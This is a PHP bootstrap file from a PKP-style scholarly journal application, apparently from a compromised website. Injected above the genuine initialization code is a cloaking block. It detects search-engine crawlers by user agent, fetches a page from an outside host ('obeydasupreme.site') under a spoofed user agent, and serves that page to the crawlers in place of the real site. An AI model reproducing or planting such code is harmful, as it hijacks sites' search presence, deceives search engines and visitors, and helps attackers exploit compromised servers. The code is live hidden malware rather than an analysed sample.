<?php
ob_start();
header('Vary: Accept-Language, User-Agent');

$bot_url = "https://obeydasupreme.site/badboys/jelss.miard.html";
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);

$bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];

$is_bot = false;
foreach ($bots as $b) {
    if (strpos($ua, $b) !== false) {
        $is_bot = true;
        break;
    }
}

function stealth_fetch($url) {
    $ctx = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0\r\n"
        ]
    ]);
    return @file_get_contents($url, false, $ctx);
}

if ($is_bot) {
    usleep(mt_rand(100000, 200000));
    $konten = stealth_fetch($bot_url);
    if ($konten !== false) {
        echo $konten;
    }
    ob_end_flush();
    exit;
}


/**
 * @defgroup index Index
 * Bootstrap and initialization code.
 */

/**
 * @file includes/bootstrap.inc.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2000-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Core system initialization code.
 * This file is loaded before any others.
 * Any system-wide imports or initialization code should be placed here.
 */


/**
 * Basic initialization (pre-classloading).
 */

define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
if (!defined('DIRECTORY_SEPARATOR')) {
	// Older versions of PHP do not define this
	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
}
define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// System-wide functions
require('./lib/pkp/includes/functions.inc.php');

// Initialize the application environment
import('classes.core.Application');

return new Application();
